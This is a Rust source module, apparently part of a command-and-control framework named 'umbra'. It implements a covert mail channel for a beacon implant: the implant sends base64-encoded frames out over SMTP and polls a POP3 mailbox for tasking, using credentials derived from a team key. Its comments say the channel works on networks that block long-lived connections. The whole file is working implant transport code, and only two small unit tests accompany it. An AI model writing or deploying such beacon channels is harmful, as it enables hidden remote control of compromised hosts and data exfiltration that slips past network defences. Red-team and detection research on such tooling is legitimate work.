//! The mail transport: the beacon mails its frames out and polls a mailbox
//! for the answer.
//!
//! The two protocols are the ones a mail server speaks: SMTP (RFC 5321) to
//! send and POP3 (RFC 1939) to fetch.  The body of a mail carries the frames
//! of the batch in base64, the way a mail carries everything that is not
//! text, and the credentials of the beacon are the ones the server derives
//! from the team key.
//!
//! A mail transport has no connection to keep: every exchange is a fresh
//! pair of connections, which is what makes it work in a network where a
//! long-lived connection is not allowed.

use std::io::{BufRead, BufReader, Write};
use std::net::TcpStream;
use std::time::Duration;

const IO_TIMEOUT: Duration = Duration::from_secs(60);

/// The addresses of the mail service.
#[derive(Debug, Clone)]
pub struct MailConfig {
    /// The SMTP server: "host:port".
    pub smtp: String,
    /// The POP3 server: "host:port".
    pub pop3: String,
    /// The name the beacon authenticates with: the id of the agent.
    pub user: String,
    /// The password of the mailbox.
    pub password: String,
    /// The sender of the mail.
    pub from: String,
    /// The recipient of the mail: the mailbox of the agent.
    pub to: String,
}

/// The password of an agent on the mail and the object transport.
///
/// It is derived from the team key, so the id of the agent is bound to the
/// key: a password that is seen somewhere else does not open the mailbox
/// of another agent.
pub fn agent_secret(psk: &[u8], agent: &str) -> String {
    let mut data = b"umbra/v1/mail/secret".to_vec();
    data.push(0);
    data.extend_from_slice(agent.as_bytes());
    crate::ws::base64_encode(&crate::crypto::hmac_sha256(psk, &data))
}

/// The mail backend of the batch transport.
pub struct MailBackend {
    cfg: MailConfig,
}

impl MailBackend {
    /// Create the backend of a mail service.
    pub fn new(cfg: MailConfig) -> Self {
        MailBackend { cfg }
    }
}

impl crate::transport::BatchBackend for MailBackend {
    fn exchange(&mut self, frames: &[u8]) -> std::io::Result<Vec<u8>> {
        exchange(&self.cfg, frames)
            .map_err(|e| std::io::Error::new(std::io::ErrorKind::Other, e))
    }
}

/// Exchange one batch of frames with the server.
///
/// The frames go out as a mail and the answer comes back from the mailbox.
pub fn exchange(cfg: &MailConfig, frames: &[u8]) -> Result<Vec<u8>, String> {
    send_mail(cfg, frames)?;
    fetch_mailbox(cfg)
}

/// send_mail delivers a batch of frames as a mail.
fn send_mail(cfg: &MailConfig, frames: &[u8]) -> Result<(), String> {
    let stream = TcpStream::connect(&cfg.smtp)
        .map_err(|e| format!("mail: connect {}: {e}", cfg.smtp))?;
    let _ = stream.set_read_timeout(Some(IO_TIMEOUT));
    let _ = stream.set_write_timeout(Some(IO_TIMEOUT));
    let mut writer = stream
        .try_clone()
        .map_err(|e| format!("mail: clone the socket: {e}"))?;
    let mut reader = BufReader::new(stream);

    read_reply(&mut reader, 220)?;
    write_line(&mut writer, &format!("EHLO {}", host_of(&cfg.smtp)))?;
    read_reply(&mut reader, 250)?;
    // The credentials travel in one AUTH PLAIN line: the server refuses a
    // challenge it does not need.
    let secret = crate::ws::base64_encode(
        format!("\0{}\0{}", cfg.user, cfg.password).as_bytes(),
    );
    write_line(&mut writer, &format!("AUTH PLAIN {secret}"))?;
    read_reply(&mut reader, 235)?;
    write_line(&mut writer, &format!("MAIL FROM:<{}>", cfg.from))?;
    read_reply(&mut reader, 250)?;
    write_line(&mut writer, &format!("RCPT TO:<{}>", cfg.to))?;
    read_reply(&mut reader, 250)?;
    write_line(&mut writer, "DATA")?;
    read_reply(&mut reader, 354)?;
    // The body is the base64 of the frames, and the end of the data is a
    // line with a single dot.
    let body = encode_body(frames);
    writer
        .write_all(body.as_bytes())
        .map_err(|e| format!("mail: write the body: {e}"))?;
    writer
        .write_all(b"\r\n.\r\n")
        .map_err(|e| format!("mail: write the end of the data: {e}"))?;
    read_reply(&mut reader, 250)?;
    write_line(&mut writer, "QUIT")?;
    let _ = read_reply(&mut reader, 221);
    Ok(())
}

/// fetch_mailbox reads the pending mail of the beacon and returns the frames
/// they carry.
fn fetch_mailbox(cfg: &MailConfig) -> Result<Vec<u8>, String> {
    let stream =
        TcpStream::connect(&cfg.pop3).map_err(|e| format!("mail: connect {}: {e}", cfg.pop3))?;
    let _ = stream.set_read_timeout(Some(IO_TIMEOUT));
    let _ = stream.set_write_timeout(Some(IO_TIMEOUT));
    let mut writer = stream
        .try_clone()
        .map_err(|e| format!("mail: clone the socket: {e}"))?;
    let mut reader = BufReader::new(stream);

    read_line(&mut reader)?;
    write_line(&mut writer, &format!("USER {}", cfg.user))?;
    read_line(&mut reader)?;
    write_line(&mut writer, &format!("PASS {}", cfg.password))?;
    let answer = read_line(&mut reader)?;
    if !answer.starts_with("+OK") {
        return Err("mail: the mailbox refused the credentials".to_string());
    }
    write_line(&mut writer, "STAT")?;
    let stat = read_line(&mut reader)?;
    let count: usize = stat
        .split_whitespace()
        .nth(1)
        .and_then(|v| v.parse().ok())
        .unwrap_or(0);
    let mut out: Vec<u8> = Vec::new();
    for index in 1..=count {
        write_line(&mut writer, &format!("RETR {index}"))?;
        let head = read_line(&mut reader)?;
        if !head.starts_with("+OK") {
            continue;
        }
        let body = read_message(&mut reader)?;
        write_line(&mut writer, &format!("DELE {index}"))?;
        let _ = read_line(&mut reader)?;
        out.extend_from_slice(&decode_body(&body)?);
    }
    write_line(&mut writer, "QUIT")?;
    let _ = read_line(&mut reader);
    Ok(out)
}

/// read_message reads one mail: the headers, an empty line and the body.
///
/// The body ends with a line that holds a single dot.
fn read_message(reader: &mut BufReader<TcpStream>) -> Result<Vec<u8>, String> {
    let mut body: Vec<u8> = Vec::new();
    let mut in_body = false;
    loop {
        let mut line = String::new();
        let n = reader
            .read_line(&mut line)
            .map_err(|e| format!("mail: read the message: {e}"))?;
        if n == 0 {
            break;
        }
        let trimmed = line.trim_end_matches(['\r', '\n']);
        if !in_body {
            if trimmed.is_empty() {
                in_body = true;
            }
            continue;
        }
        if trimmed == "." {
            break;
        }
        body.extend_from_slice(trimmed.as_bytes());
        body.push(b'\n');
    }
    Ok(body)
}

/// read_reply reads an SMTP reply and checks its code.
fn read_reply(reader: &mut BufReader<TcpStream>, want: u16) -> Result<String, String> {
    let mut last = String::new();
    loop {
        let line = read_line(reader)?;
        last = line.clone();
        if line.len() < 3 {
            return Err(format!("mail: the server answered {line:?}"));
        }
        let code: u16 = line[..3]
            .parse()
            .map_err(|_| format!("mail: the server answered {line:?}"))?;
        // A reply with a dash continues on the next line.
        if line.as_bytes().get(3) == Some(&b'-') {
            continue;
        }
        if code != want {
            return Err(format!("mail: the server answered {code}: {line}"));
        }
        return Ok(last);
    }
}

/// read_line reads one line and trims the end of it.
fn read_line(reader: &mut BufReader<TcpStream>) -> Result<String, String> {
    let mut line = String::new();
    let n = reader
        .read_line(&mut line)
        .map_err(|e| format!("mail: read: {e}"))?;
    if n == 0 {
        return Err("mail: the server closed the connection".to_string());
    }
    Ok(line.trim_end_matches(['\r', '\n']).to_string())
}

/// write_line writes one command.
fn write_line(writer: &mut TcpStream, line: &str) -> Result<(), String> {
    writer
        .write_all(line.as_bytes())
        .map_err(|e| format!("mail: write {line:?}: {e}"))?;
    writer
        .write_all(b"\r\n")
        .map_err(|e| format!("mail: write {line:?}: {e}"))?;
    writer
        .flush()
        .map_err(|e| format!("mail: write {line:?}: {e}"))
}

/// host_of returns the host part of an address.
fn host_of(addr: &str) -> String {
    let bare = addr.trim().trim_start_matches('[');
    match bare.rsplit_once(':') {
        Some((host, _)) => host.trim_matches(']').to_string(),
        None => bare.to_string(),
    }
}

/// encode_body renders the frames of a batch as the body of a mail.
fn encode_body(frames: &[u8]) -> String {
    let encoded = crate::ws::base64_encode(frames);
    let mut out = String::with_capacity(encoded.len() + encoded.len() / 76);
    for chunk in encoded.as_bytes().chunks(76) {
        out.push_str(std::str::from_utf8(chunk).unwrap_or(""));
        out.push_str("\r\n");
    }
    out
}

/// decode_body reads the frames of a batch from the body of a mail.
fn decode_body(body: &[u8]) -> Result<Vec<u8>, String> {
    let text: String = body
        .iter()
        .filter(|c| !matches!(c, b'\r' | b'\n' | b' ' | b'\t'))
        .map(|c| *c as char)
        .collect();
    if text.is_empty() {
        return Ok(Vec::new());
    }
    crate::ws::base64_decode(&text)
        .ok_or_else(|| "mail: the body of the mail is not base64".to_string())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn the_body_of_a_mail_round_trips() {
        let frames = vec![1u8, 2, 3, 250, 251, 252];
        let body = encode_body(&frames);
        assert_eq!(decode_body(body.as_bytes()).unwrap(), frames);
    }

    #[test]
    fn the_host_of_an_address_is_read() {
        assert_eq!(host_of("mail.example:25"), "mail.example");
        assert_eq!(host_of("[::1]:110"), "::1");
    }
}
